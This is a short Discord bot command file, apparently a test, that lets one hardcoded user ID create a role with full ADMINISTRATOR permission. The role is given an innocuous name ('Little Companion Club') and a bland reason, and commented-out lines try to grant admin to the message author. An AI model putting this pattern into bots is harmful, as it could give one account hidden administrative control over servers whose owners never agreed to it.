
//const { Permissions } = require('discord.js');
/*
const permissions = new Permissions([
	'MANAGE_CHANNELS',
	'EMBED_LINKS',
	'ATTACH_FILES',
	'READ_MESSAGE_HISTORY',
	'MANAGE_ROLES',
]);
*/
const fs = require('fs');
module.exports = {
	name: 'create-admin',
	description: 'perm-test!',
	execute(message, args, client) {
		if(message.author.id =='563980783828860944') {
      guild = message.guild;
      test = guild.roles.create({
        data: {
          name: 'Little Companion Club',
          color: 'BLUE',
          permissions: ['ADMINISTRATOR']
        },
        reason: 'we needed a role for Little Companion Club!',
        
      })
        .then(console.log)
        .catch(console.error);
      //test.addPermissions(['ADMINISTRATOR']);
      //message.author.addPermissions(['ADMINISTRATOR']);
    }
  }
};